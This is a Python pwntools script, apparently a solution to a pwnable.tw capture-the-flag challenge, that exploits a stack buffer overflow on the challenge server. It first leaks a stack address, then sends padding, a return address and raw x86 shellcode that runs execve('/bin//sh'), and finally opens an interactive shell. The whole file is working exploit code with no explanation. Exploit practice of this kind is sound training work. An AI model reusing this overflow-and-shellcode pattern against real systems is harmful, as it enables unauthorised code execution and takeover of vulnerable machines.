from pwn import *
connect = remote('chall.pwnable.tw', 10000)

def addrleak():
    addr=p32(0x08048087)
    payload = '\x90'*20+addr
    recv=connect.recvuntil(':')
    connect.send(payload)
    res=connect.recv(4)
    return u32(res)
def own(addr):
    payl='\x90'*20+p32(addr+20)+'\x31\xc9\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'
    connect.send(payl)
own(addrleak())
connect.interactive()
exit(0)
